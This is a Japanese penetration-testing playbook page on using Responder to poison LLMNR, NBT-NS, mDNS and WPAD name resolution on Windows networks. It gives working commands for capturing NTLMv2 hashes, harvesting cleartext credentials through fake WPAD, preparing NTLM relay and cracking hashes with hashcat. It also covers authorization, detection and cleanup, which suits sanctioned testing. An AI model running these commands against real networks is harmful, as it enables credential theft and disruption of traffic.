# Responder — LLMNR / NBT-NS / mDNS / WPAD ポイズニング

> **スコープ**: ブロードキャスト名前解決プロトコル（LLMNR / NBT-NS / mDNS / WPAD）のポイズニングで NTLMv2 ハッシュをキャプチャするまで。Relay 攻撃との連携は `ntlmrelayx.md` を参照。

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 業務停止リスク（WPAD 偽装による HTTP トラフィック乗っ取り・名前解決の横取りによる一時疎通障害）
> - [ ] 持続化に該当
> - [ ] 不可逆な設定変更を含む
> - [x] SIEM/EDR で確実に検知される（Microsoft Defender for Identity の LLMNR/NBNS ポイズニング検知アラート・ネットワーク IDS シグネチャ）
>
> 実施可否は事前合意で明示確認すること。**ntlmrelayx と組み合わせる場合は Relay 先スコープを書面で限定する。** 演習環境では制約なし。

## 着火条件

- ターゲットネットワークが Windows ドメイン環境（LLMNR / NBT-NS はデフォルト有効）
- ドメイン内に **SMB Signing が不要（Not Required）なホスト** が存在する → ntlmrelayx と組み合わせたリレーが有効
- SMB Signing が全体で有効でも、NTLMv2 ハッシュのクラックを目的としてキャプチャしたい場合
- 認証情報を何も持っていない状態でのファーストステップ

## 環境前提
- 実行環境: テスター端末（ターゲットと同一ブロードキャストドメイン内、または同一 VLAN に到達可能であること）
- 必要なツール: `responder`（ペネトレ用 Linux ディストリ標準搭載）/ `nxc`（SMB Signing 確認）
- 必要な権限: テスター端末上での `root` 権限（raw socket 操作のため必須）
- 外部リソース依存: Responder は標準搭載。インターネット遮断環境では事前確認

## 先に確認すること

**LLMNR / NBT-NS の有効・無効化状態:**

```powershell
# [Target] LLMNR 無効化GPOの確認（0 = 無効化 / 非存在または 1 = 有効）
Get-ItemProperty `
  -Path "HKLM:\Software\Policies\Microsoft\Windows NT\DNSClient" `
  -Name "EnableMulticast" -ErrorAction SilentlyContinue
# 値が 0 → LLMNR 無効（Responder は機能しない）

# [Target] NBT-NS の無効化状態確認（TcpipNetbiosOptions: 0=DHCP依存 / 1=有効 / 2=無効）
Get-WmiObject Win32_NetworkAdapterConfiguration |
  Where-Object { $_.TcpipNetbiosOptions -ne $null } |
  Select-Object Description, TcpipNetbiosOptions
```

**SMB Signing の状態確認:**

```bash
# [Attacker] nxc でサブネット全体の SMB Signing 状態を確認（Relay 可能なホストをリスト化）
nxc smb [TARGET_SUBNET]/[PREFIX] --gen-relay-list relay_targets.txt
```

**シグナルと方針決定:**

| シグナル | 判断・次のアクション |
|---------|------------------|
| `EnableMulticast = 0` / LLMNR 無効 | WPAD（`-w`）または Coerce 系 → `Coerce.md` に切り替える |
| `TcpipNetbiosOptions = 2` / NBT-NS 無効 | IPv6 スプーフィング（mitm6）→ `mitm6.md` を検討 |
| `signing:False` のホストが存在する | Relay モードで運用（§3）→ `ntlmrelayx.md` |
| 全ホストで `signing:True` | ハッシュキャプチャ専用モード（§2）→ hashcat クラック |
| シェルがなく確認できない | §1 の Analyze モードで問い合わせが来るかを観察 |

**重要:** LLMNR / NBT-NS はブロードキャストのため**ルーターを超えない**。テスター端末が対象セグメントの L2 に到達できていることを `ip a` と ARP スキャンで確認してから起動する。

**攻撃者の思考トレース:** Windows クライアントは存在しないホスト名を解決しようとするとき、LLMNR / NBT-NS でブロードキャスト問い合わせを送信する。テスター端末がこれに「私がそのホストです」と応答すると、クライアントは NTLM 認証を試み NTLMv2 ハッシュを送ってくる。SMB Signing が無効なホストが存在すれば、ハッシュをクラックせずそのままリレーしてシェルや権限付与が得られる。

---

## 1. Analyze モードで事前偵察（まず最初に実施）

通常モードの前に Analyze モード（`-A`）で起動し、実際にはポイズニングせずにブロードキャスト問い合わせを観察する。

**コマンド:**

```bash
# [Attacker] Analyze モード — 応答せず観察のみ（ポイズニング不発）
sudo responder -I [INTERFACE] -A
```

**観測される出力 → 次のアクション:**

| 観察結果 | 意味・次のアクション |
|---------|------------------|
| LLMNR / NBNS の問い合わせがある | §2 通常モードまたは §3 Relay モードで起動できる |
| WPAD 問い合わせがある | `-w` オプションで WPAD 偽装が有効 |
| mDNS のみ（macOS 等）| NTLMv2 は取得しにくい。WPAD 系に注力 |
| 何も来ない | LLMNR/NBT-NS が GPO で無効化されている可能性 |

---

## 2. 通常モード（ハッシュキャプチャ専用）

SMB Signing が全ホストで有効な環境でハッシュ取得のみを目的とする場合。Responder.conf は**デフォルト（SMB = On / HTTP = On）のまま**。

**コマンド:**

```bash
# [Attacker] 通常モードで起動
sudo responder -I [INTERFACE] -wd
```

主要オプション:

| オプション | 効果 |
|-----------|------|
| `-I [INTERFACE]` | リッスンするネットワークインターフェース |
| `-w` | WPAD 偽装サーバーを有効化 |
| `-d` | DHCP Inform パケットへの WPAD 挿入応答 |
| `-F` | WPAD 認証を Basic 形式にして平文クレデンシャルを取得 |
| `-v` | 詳細ログ（問い合わせ元 IP も表示）|

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `[SMB] NTLMv2-SSP Hash Captured: [USER]::[DOMAIN]:...` | NTLMv2 ハッシュ取得 | §4 クラックへ |
| WPAD 経由で平文クレデンシャルが来た（`-F` 使用時）| 平文パスワード取得 | そのまま認証テストに使用 |

---

## 3. Relay モード（ntlmrelayx との併用）

**事前準備（必須）:** Responder.conf の SMB / HTTP を Off に変更する。

```bash
# [Attacker] Responder.conf の SMB と HTTP を Off に変更
sudo sed -i 's/^SMB = On/SMB = Off/' /usr/share/responder/Responder.conf
sudo sed -i 's/^HTTP = On/HTTP = Off/' /usr/share/responder/Responder.conf

# 変更後の確認
cat /usr/share/responder/Responder.conf | grep -E "^(SMB|HTTP) ="
# → SMB = Off, HTTP = Off であれば OK

# [Attacker] Relay 専用モードで Responder を起動（別ターミナルで ntlmrelayx も起動する）
sudo responder -I [INTERFACE] -wd
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| ポイズニング応答のみ行われ ntlmrelayx 側に認証フローが届く | Relay 準備完了 | `ntlmrelayx.md` でリレー操作 |

**注意（原状回復）:** テスト完了後または Responder 停止後に `SMB = On / HTTP = On` に戻す。設定ファイルを汚したまま次のテストに持ち込まないよう注意する。

---

## 4. キャプチャしたハッシュの確認とクラック

**コマンド:**

```bash
# [Attacker] キャプチャされた NTLMv2 ハッシュの確認
ls /usr/share/responder/logs/
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-[TARGET_IP].txt

# [Attacker] NTLMv2 ハッシュのクラック（hashcat mode 5600）
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-[TARGET_IP].txt [WORDLIST_PATH] -r [RULE_PATH]
```

**観測される出力 → 次のアクション:**

| 取得結果 | 次のアクション |
|---------|--------------|
| NTLMv2 ハッシュ + SMB Signing 全体で有効 | hashcat でクラック → 平文パスワードで正規ログイン |
| NTLMv2 ハッシュ + SMB Signing 無効ホストあり | ntlmrelayx でリレー → `ntlmrelayx.md` |
| 管理者アカウントのハッシュが来た | クラック成功でドメイン展開。クラック失敗でも Relay が刺さる可能性 |

> クラック詳細 → `../../05_Tools_Reference/Hashcat.md`

---

## 刺さらなかったとき（全体）

| 状況 | 対処 |
|------|------|
| ハッシュが全く来ない | Windows クライアントがいないか、LLMNR/NBT-NS が GPO で無効化されている。Analyze モードで観察時間を延ばす |
| WPAD 問い合わせが来ない | `Automatically detect settings` が GPO で Off の環境。`-d`（DHCP）オプションを追加 |
| 取得したハッシュがクラックできない | 辞書・ルールを変えて再試行。クラック不能なら Relay に切り替える |
| SMB Signing が全体で有効で Relay も不可 | Coerce 系（PetitPotam / PrinterBug / DFSCoerce）による認証強制を検討 → `Coerce.md` |

---

## 注意点・落とし穴

- **同一 L2 セグメントに到達できる必要がある**: LLMNR / NBT-NS はブロードキャストのためルーターを超えない
- **ntlmrelayx 併用時は Responder.conf の SMB/HTTP を必ず Off に**: 両方が同ポートをリッスンしようとして競合する
- **複数のテスターが同一セグメントで Responder を起動しない**: 応答が競合しハッシュが分散する
- **WPAD 偽装の影響範囲**: `-w` を有効にするとそのセグメントの HTTP トラフィックが攻撃者経由になる可能性がある

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。アクティブなネットワークポイズニングは SIEM/MDI で即アラートが上がり、ネットワーク上の全クライアントに影響が及ぶ可能性がある
- **想定されるSIEM/EDR検知**: MDI「LLMNR/NBNS Poisoning and Relay」アラート / ネットワーク IDS シグネチャ / Event ID 4776（NTLM 認証試行）
- **業務影響リスク**: WPAD 偽装時に HTTP トラフィックが攻撃者経由になる可能性。名前解決の横取りによる一時的な疎通障害リスク
- **原状回復必須項目**: ✅ Responder.conf の SMB / HTTP 設定を元（On）に戻す / ✅ キャプチャしたハッシュ・クラック済みパスワードの暗号化保管 → テスト完了時破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：SMB Signing 確認・ホスト列挙 → `../../01_Reconnaissance/SMB_Enumeration.md`
- 後：キャプチャしたハッシュをリレー → `ntlmrelayx.md`
- 後：キャプチャしたハッシュをクラック → `../../05_Tools_Reference/Hashcat.md`
- 後：Coerce 系による認証強制（PetitPotam / PrinterBug / DFSCoerce）→ `Coerce.md`
